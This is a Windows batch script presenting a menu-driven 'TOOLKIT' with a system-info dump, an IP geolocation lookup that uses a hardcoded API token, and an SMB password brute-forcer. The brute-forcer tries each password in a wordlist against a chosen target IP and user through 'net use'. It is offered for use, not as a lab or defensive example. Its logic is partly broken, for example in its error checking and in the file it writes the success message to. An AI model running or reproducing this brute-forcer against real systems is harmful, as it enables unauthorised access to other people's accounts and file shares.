@echo off

REM banners "patorjk's cheese"
mode 75, 30
chcp 65001 >nul
call powershell exit >nul
color A
cd files

REM Menu
:menu
cls
title TOOLKIT
echo.
type ".\banners\menubanner.txt"
echo.
echo.
echo         TOOLS
echo       ---------
echo     Add an 's' after the tool number to save the output to save folder
echo.
echo     0) Help
echo     1) Pc info
echo     2) SMB Bruteforce
echo     3) Trace IP
echo.
set /p menuInput=">> "
set /a save=0
if /I "%menuInput:~1,2%" EQU "s" (set /a save=1)
if /I "%menuInput:~0,1%" EQU "0" goto help
if /I "%menuInput:~0,1%" EQU "1" goto pcInfo
if /I "%menuInput:~0,1%" EQU "2" goto smb
if /I "%menuInput:~0,1%" EQU "3" goto traceIp
echo Invalid Tool. Try again!
pause
goto menu

REM Help
:help
cls
title Help
type ".\banners\help.txt"
echo.
echo.
echo         HELP
echo       ---------
echo     0) Return to menu
echo     1) Pc info
echo     2) SMB Bruteforce
echo     3) Trace IP
echo.
set /p helpInput=">> "
if /I "%helpInput%" EQU "0" goto menu
if /I "%helpInput%" EQU "1" goto helpPcInfo
if /I "%helpInput%" EQU "2" goto helpSmb
if /I "%helpInput%" EQU "3" goto helpTraceIp
echo Invalid help. Try again!
pause
goto help

:helpPcInfo
cls
title Help Pc Info
type ".\banners\help.txt"
echo.
echo The Pc Info tool can...
pause
goto menu

:helpSmb
cls
title Help SMB
type ".\banners\help.txt"
echo.
echo The SMB Bruteforcer can...
pause
goto menu

:helpTraceIp
cls
title Help Trace IP
type ".\banners\help.txt"
echo.
echo The Trace IP tool can...
pause
goto menu

REM Pc Info
:pcInfo
cls
title Pc Info
type ".\banners\pcinfo.txt"
echo.
systeminfo
if %save% EQU 1 (
    echo PCINFO OUTPUT > ../save/pcInfo.txt
    echo. >> ../save/pcInfo.txt
    systeminfo >> ../save/pcInfo.txt
)
pause
goto menu

REM SMB Bruteforce
:smb
cls
title SMB Bruteforce
type ".\banners\smb.txt"
echo.
echo.
echo       SMB TOOLS
echo       ---------
echo     0) Return to menu
echo     1) With user and password
echo     2) Only ip (usefull to connect to localhost etc.)
echo.
set /p smbInput=">> "
if /I "%smbInput%" EQU "0" goto menu
if /I "%smbInput%" EQU "1" goto smbUsrPsswrd
if /I "%smbInput%" EQU "2" goto smbOnlyIp
echo Invalid SMB Tool. Try again!
pause
goto smb

:smbUsrPsswrd
cls
title SMB Bruteforce User, Password
type ".\banners\smb.txt"
echo.
set /p ip="Enter the target IP>> "
set /p user="Enter the target user>> "
set /p wordlist="Enter the password list>> "

set /a count=1
for /f %%a in (%wordlist%) do (
    set pass=%%a
    call :attempt
)
echo.
echo Password not found for %user% %ip%! :(
pause
goto menu

:smbOnlyIp
cls
title SMB Bruteforce Only Ip
type ".\banners\smb.txt"
echo.
set /p ip="Enter the target IP>> "
net use \\%ip% >nul 2>&1
if %errorlevel% EQU 0 (
    echo.
    echo Able to connect to %ip% without password!
    net use \\%ip% /d /y >nul 2>&1
    pause
    goto menu
) else (
    echo.
    echo Unable to connect to %ip% without password :(
    net use \\%ip% /d /y >nul 2>&1
    pause
    goto menu
)

:success
echo.
echo Password found for %user% %ip%! >> %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto menu

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

REM Trace IP
:traceIp
cls
title Trace IP
type ".\banners\traceip.txt"
echo.
set /p ip="Enter the target IP>> "
curl -s https://api.findip.net/%ip%/?token=01e50d025741485196e37ee3567be22c -o ipinfo.json
for /F %%i in ('.\jq.exe .continent.names.en ipinfo.json') do set continent=%%i
for /F %%i in ('.\jq.exe .country.names.en ipinfo.json') do set country=%%i
for /F %%i in ('.\jq.exe .city.names.en ipinfo.json') do set city=%%i
for /F %%i in ('.\jq.exe .location.latitude ipinfo.json') do set latitude=%%i
for /F %%i in ('.\jq.exe .location.longitude ipinfo.json') do set longitude=%%i
for /F %%i in ('.\jq.exe .location.time_zone ipinfo.json') do set time_zone=%%i
echo.
echo      %ip%
echo       ---------
echo      Continent: %continent%
echo      Country: %country%
echo      City: %city%"
echo      Coordinates(lat, long): %latitude% %longitude%
echo      Time zone: %time_zone%
echo.
if %save% EQU 1 (
    echo TRACEIP OUTPUT > ../save/traceIP.txt
    echo. >> ../save/traceIP.txt
    echo %ip% >> ../save/traceIP.txt
    echo  --------- >> ../save/traceIP.txt
    echo Continent: %continent% >> ../save/traceIP.txt
    echo Country: %country% >> ../save/traceIP.txt
    echo City: %city% >> ../save/traceIP.txt
    echo Coordinates(lat, long): %latitude% %longitude% >> ../save/traceIP.txt
    echo Time zone: %time_zone% >> ../save/traceIP.txt
    pause
    "" > ipinfo.json
    goto menu
)
pause
"" > ipinfo.json
goto menu

REM Others